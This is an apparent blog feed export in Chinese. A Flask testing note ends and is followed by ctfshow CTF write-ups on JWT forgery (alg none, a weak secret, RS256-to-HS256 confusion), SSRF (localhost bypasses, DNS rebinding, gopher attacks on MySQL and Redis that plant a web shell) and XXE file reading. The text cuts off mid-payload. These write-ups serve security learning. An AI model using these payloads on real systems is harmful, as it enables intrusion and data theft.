create_app, db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BasicsTestCase</span>(<span class="params">unittest.TestCase</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.app = create_app(<span class="string">&#x27;testing&#x27;</span>)</span><br><span class="line">        self.app_context = self.app.app_context()</span><br><span class="line">        self.app_context.push()</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tearDown</span>(<span class="params">self</span>):</span></span><br><span class="line">        db.session.remove()</span><br><span class="line">        db.drop_all()</span><br><span class="line">        self.app_context.pop()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_app_exists</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.assertFalse(current_app <span class="keyword">is</span> <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_app_is_testing</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.assertTrue(current_app.config[<span class="string">&#x27;TESTING&#x27;</span>])</span><br></pre></td></tr></table></figure><p>使用 unittest 包编写 <a href="https://docs.python.org/2/library/unittest.html">https://docs.python.org/2/library/unittest.html</a></p><p> setUp() 和 tearDown() 方法分别在各测试前后运行</p><p>以 test_ 开头的函数都作为测试执行 </p><p>然后书中给了在manger.py里面编写测试函数的示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">test_names</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Run the unit tests.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> unittest</span><br><span class="line">    <span class="keyword">if</span> test_names:</span><br><span class="line">        tests = unittest.TestLoader().loadTestsFromNames(test_names)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tests = unittest.TestLoader().discover(<span class="string">&#x27;tests&#x27;</span>)</span><br><span class="line">    unittest.TextTestRunner(verbosity=<span class="number">2</span>).run(tests)</span><br></pre></td></tr></table></figure><h3 id="值得注意的引用"><a href="#值得注意的引用" class="headerlink" title="值得注意的引用"></a>值得注意的引用</h3><p>一些比较重要的各个文件直接的交叉引用</p><p>蓝本里面<code>app/main/__init__.py</code> 会引用views和errors</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views, errors</span><br></pre></td></tr></table></figure><p>views和errors又会引用蓝本<code>app/main/__init__.py</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> main</span><br></pre></td></tr></table></figure><p>然后就基本用到什么就导入什么,只是这种导入还不习惯.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> xxx</span><br><span class="line"><span class="keyword">from</span> .xxx <span class="keyword">import</span> xxx</span><br><span class="line"><span class="keyword">from</span> ..xxx <span class="keyword">import</span> xxx</span><br></pre></td></tr></table></figure><blockquote><p>基础知识就到这</p><p>整个代码打包放在了GitHub. <a href="https://github.com/L0nm4r/FlaskLearn">https://github.com/L0nm4r/FlaskLearn</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-JWT-WP</title>
      <link href="2021/01/21/JWT/"/>
      <url>2021/01/21/JWT/</url>
      
        <content type="html"><![CDATA[<h2 id="345"><a href="#345" class="headerlink" title="345"></a>345</h2><p>抓包发现有<code>auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoidXNlciJ9XQ</code></p><p>base64解开后是<code>&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;</code>和<code>[&#123;&quot;sub&quot;:&quot;user&quot;&#125;]</code></p><p>根据这篇文章里面介绍的:<br><a href="https://cloud.tencent.com/developer/article/1620770">https://cloud.tencent.com/developer/article/1620770</a></p><p>header 是 <code>&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;</code></p><p>payload: <code>[&#123;&quot;sub&quot;:&quot;user&quot;&#125;]</code></p><p>没有看到签名信息. </p><p>payload里的sub信息就是jwt所面向的用户</p><p>修改这个为admin,再base64编码一下 得到下面的</p><p><code>auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoiYWRtaW4ifV0=</code></p><p>带着这个cookie发送到/admin下就得到flag了</p><h2 id="346"><a href="#346" class="headerlink" title="346"></a>346</h2><p>jwt迅速解开可以用 <a href="https://jwt.io/">https://jwt.io/</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">jwt信息</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;iat&quot;</span>: <span class="number">1610777230</span>,</span><br><span class="line">  <span class="attr">&quot;exp&quot;</span>: <span class="number">1610784430</span>,</span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span>: <span class="number">1610777230</span>,</span><br><span class="line">  <span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;jti&quot;</span>: <span class="string">&quot;a2c361f745f3e100752ad84e566a811b&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考<a href="https://www.cnblogs.com/dliv3/p/7450057.html">这篇文章</a>里面的,将JWT算法改为none</p><blockquote><p><a href="https://www.cnblogs.com/dliv3/p/7450057.html">https://www.cnblogs.com/dliv3/p/7450057.html</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jwtBase64Encode</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(x.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode().replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">header = <span class="string">&#x27;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1610777230,&quot;exp&quot;:1610784430,&quot;nbf&quot;:1610777230,&quot;sub&quot;:&quot;admin&quot;,&#x27;</span> \</span><br><span class="line">          <span class="string">&#x27;&quot;jti&quot;:&quot;a2c361f745f3e100752ad84e566a811b&quot;&#125; &#x27;</span></span><br><span class="line"></span><br><span class="line">print(jwtBase64Encode(header)+<span class="string">&#x27;.&#x27;</span>+jwtBase64Encode(payload)+<span class="string">&#x27;.&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="347"><a href="#347" class="headerlink" title="347"></a>347</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">jwt信息</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;iat&quot;</span>: <span class="number">1610777706</span>,</span><br><span class="line">  <span class="attr">&quot;exp&quot;</span>: <span class="number">1610784906</span>,</span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span>: <span class="number">1610777706</span>,</span><br><span class="line">  <span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;jti&quot;</span>: <span class="string">&quot;a4b369d0b43dd96bcf980881e3f0d5ea&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是HS256这种加密算法,这次再把加密方式改为none就失败了.</p><p>还有一种方法就是爆破密钥 <a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a> 进行爆破:</p><p>爆破了好久,发现不行…</p><p>看大佬wp发现是123456.应该是 <a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a> 暴力破解效率太低了</p><p>根据secret生成jwt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1610777706</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1610784906</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1610777706</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;a4b369d0b43dd96bcf980881e3f0d5ea&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">secret = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line">print(jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>))</span><br></pre></td></tr></table></figure><p>或者直接在这生成<a href="https://jwt.io/">https://jwt.io/</a></p><h2 id="348"><a href="#348" class="headerlink" title="348"></a>348</h2><p>jwt信息</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;iat&quot;</span>: <span class="number">1610779763</span>,</span><br><span class="line">  <span class="attr">&quot;exp&quot;</span>: <span class="number">1610786963</span>,</span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span>: <span class="number">1610779763</span>,</span><br><span class="line">  <span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;jti&quot;</span>: <span class="string">&quot;388f3cebe059e8118a6fc1a4f839a81f&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接爆破</p><p><img src="1610779796205.png" alt="1610779796205"></p><p>用上面的python脚本进行伪造adminJWT即可</p><h2 id="349"><a href="#349" class="headerlink" title="349"></a>349</h2><p>jwt信息</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;iat&quot;</span>: <span class="number">1610780008</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RS256加密类型,只搜索到一种攻击思路 修改算法RS256为HS256（非对称密码算法 =&gt; 对称密码算法）</p><p> 如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名</p><p>我们需要获取到公钥</p><p>题目给了一段node的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.readFileSync(process.cwd()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.sign(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.cookie(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.end(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> auth = req.cookies.auth;</span><br><span class="line"><span class="keyword">var</span> cert = fs.readFileSync(process.cwd()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">jwt.verify(auth, cert, <span class="function"><span class="keyword">function</span>(<span class="params">err, decoded</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(decoded.user===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.end(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>访问/public.key可以直接得到公钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNioS2aSHtu6WIU88oWzpShhkb</span><br><span class="line">+r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn&#x2F;r9D&#x2F;bFcadHGnX</span><br><span class="line">YqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjA</span><br><span class="line">bG1Naz58ibbtogeglQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>然后同样的方法得到私钥</p><p>再用<a href="https://jwt.io/%E4%BC%AA%E9%80%A0(%E5%B0%B1%E4%B8%8D%E7%94%A8%E4%BF%AE%E6%94%B9%E7%AE%97%E6%B3%95%E4%BA%86)">https://jwt.io/伪造(就不用修改算法了)</a></p><p><img src="1610781097322.png" alt="1610781097322"></p><p>然后直接POST</p><p><img src="1610781046452.png" alt="1610781046452"></p><h2 id="350"><a href="#350" class="headerlink" title="350"></a>350</h2><p>直接给了源码,里面有public key</p><p>可以直接修改算法RS256为HS256（非对称密码算法 =&gt; 对称密码算法）</p><p>python写算法老是出错.原因暂不清楚</p><p><img src="1610782553764.png" alt="1610782553764"></p><p>看yu22x师傅博客是直接用node写的exp</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> privateKey = fs.readFileSync(<span class="string">&#x27;public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.sign(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="built_in">console</span>.log(token)</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTA3ODI3MDV9.6K4MH3aChKyeyIFtDCWRBO33P8QgrB7wPeOUjF-URGg</span><br></pre></td></tr></table></figure><p><img src="1610782779007.png" alt="1610782779007"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web入门 SSRF WP</title>
      <link href="2021/01/15/SSRF/"/>
      <url>2021/01/15/SSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><p>直接访问flag.php</p><p><img src="1610676416204.png" alt="1610676416204"></p><p>POST传参</p><p><img src="1610676454610.png" alt="1610676454610"></p><h2 id="352-353"><a href="#352-353" class="headerlink" title="352 353"></a>352 353</h2><p>限制了HTTP协议,ban掉了localhost和127.0.0.1</p><p>payload: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;127.1&#x2F;flag.php</span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;0&#x2F;flag.php</span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;0.0.0.0&#x2F;flag.php</span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;spoofed.burpcollaborator.net&#x2F;flag.php</span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;127.127.127.127&#x2F;flag.php</span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;0177.0.0.1&#x2F;flag.php</span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;2130706433&#x2F;flag.php</span><br></pre></td></tr></table></figure><blockquote><p>参考这篇公众号里面的方法: <a href="https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&amp;mid=2247488685&amp;idx=1&amp;sn=5e1358879423a2402ae9316c1b454a79&amp;chksm=fa686ddccd1fe4ca81b4f5b6f5b08d38a1a9900dbca18b3b8fe7a9c69dc41ff6a671dc09b572&amp;mpshare=1&amp;srcid=0724B38ETzODsggAeJQq0NUh&amp;sharer_sharetime=1603804699721&amp;sharer_shareid=23084298e2b2fbf6c63c28aed6685355&amp;scene=1&amp;subscene=10000&amp;clicktime=1603805422&amp;enterid=1603805422&amp;ascene=1&amp;devicetype=android-29&amp;version=27001353&amp;nettype=WIFI&amp;abtest_cookie=AAACAA==&amp;lang=zh_CN&amp;exportkey=AYbhwft+vac8rXbFPobPN2M=&amp;pass_ticket=X55y4G263ILSYM3Pr0eJPlXY+GJ1i0vomPMJs5wLB7fXK4bPafvwcmZ79w+zXEAZ&amp;wx_header=1">https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&amp;mid=2247488685&amp;idx=1&amp;sn=5e1358879423a2402ae9316c1b454a79&amp;chksm=fa686ddccd1fe4ca81b4f5b6f5b08d38a1a9900dbca18b3b8fe7a9c69dc41ff6a671dc09b572&amp;mpshare=1&amp;srcid=0724B38ETzODsggAeJQq0NUh&amp;sharer_sharetime=1603804699721&amp;sharer_shareid=23084298e2b2fbf6c63c28aed6685355&amp;scene=1&amp;subscene=10000&amp;clicktime=1603805422&amp;enterid=1603805422&amp;ascene=1&amp;devicetype=android-29&amp;version=27001353&amp;nettype=WIFI&amp;abtest_cookie=AAACAA%3D%3D&amp;lang=zh_CN&amp;exportkey=AYbhwft%2Bvac8rXbFPobPN2M%3D&amp;pass_ticket=X55y4G263ILSYM3Pr0eJPlXY%2BGJ1i0vomPMJs5wLB7fXK4bPafvwcmZ79w%2BzXEAZ&amp;wx_header=1</a></p><p>还有la师傅博客 <a href="https://lazzzaro.github.io/2020/09/03/web-">https://lazzzaro.github.io/2020/09/03/web-</a></p></blockquote><h2 id="353"><a href="#353" class="headerlink" title="353"></a>353</h2><p><code>url=http://2130706433/flag.php</code></p><h2 id="354"><a href="#354" class="headerlink" title="354"></a>354</h2><p><code>url=http://spoofed.burpcollaborator.net/flag.php</code></p><h2 id="355-356"><a href="#355-356" class="headerlink" title="355 356"></a>355 356</h2><p><code>url=http://0/flag.php</code></p><p>利用的trick是去0地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">去0地址</span><br><span class="line">http:&#x2F;&#x2F;0&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.1</span><br><span class="line">http:&#x2F;&#x2F;127.0.1</span><br></pre></td></tr></table></figure><h2 id="357"><a href="#357" class="headerlink" title="357"></a>357</h2><p>用var_filter做了严格的限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)</span><br></pre></td></tr></table></figure><p>看到网上用dns rebind绕过的思路</p><p>具体方法参考y1ng师傅的blog <a href="https://www.gem-love.com/websecurity/2733.html">https://www.gem-love.com/websecurity/2733.html</a></p><blockquote><p>但是不知道为什么一直不成功</p></blockquote><p>看了下yu22x师傅的博客,302跳转和dns rebind都可以</p><ol><li><p>302跳转 </p><p>依旧失败,猜测这两次是用python搭建HTTP服务才失败的</p></li><li><p>dns rebind</p></li></ol><p>注册 <a href="http://ceye.io/profile">http://ceye.io/profile</a></p><p>填写以下信息</p><p><img src="1610684163757.png" alt="1610684163757"></p><p>然后POST<code>url=http://r.mtvhjl.ceye.io/flag.php</code>多试几次就成功了</p><p>也可以用y1ng师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line">s = req.session()</span><br><span class="line">url = <span class="string">&quot;http://1ac5ed8f-5525-4fb4-983e-e5e73f4fb345.chall.ctf.show/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://r.xxxxxxx.ceye.io/flag.php&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = s.post(url=url, data=data, timeout=<span class="number">5</span>).text</span><br><span class="line">        print(text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure><h2 id="358"><a href="#358" class="headerlink" title="358"></a>358</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过正则: <code>url=http://ctf.@127.0.0.1/flag.php?show</code></p><h2 id="359"><a href="#359" class="headerlink" title="359"></a>359</h2><p>可以用gopher打MySQL</p><p>直接用工具生成payload (sql语句记得加<code>;</code>) , 地址 <a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p><img src="1610686730851.png" alt="1610686730851"></p><p>再在check.php POSTreurl=xxx,<code>_</code>后面的字符要再进行一次url编码</p><p>然后shell.php</p><p><img src="1610686860473.png" alt="1610686860473"></p><h2 id="360"><a href="#360" class="headerlink" title="360"></a>360</h2><p>打redis</p><p><img src="1610686930419.png" alt="1610686930419"></p><p>POST提交后,访问<code>http://0d47ce0e-1906-401e-8f5a-47562108f93f.chall.ctf.show/shell.php?cmd=cat /flaaag</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 安全 </category>
          
          <category> CTFSHOW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_xxe</title>
      <link href="2021/01/13/xxe/"/>
      <url>2021/01/13/xxe/</url>
      
        <content type="html"><![CDATA[<h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><p>用burp post下面的数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h2><p>无回显XXE</p><p>可以用python构造一个静态服务器 (这里监听和静态服务是一个端口)</p><p><code>python3 -m http.server 8000</code></p><p>payload: </p><figure class="highlight xml"><table><tr><td 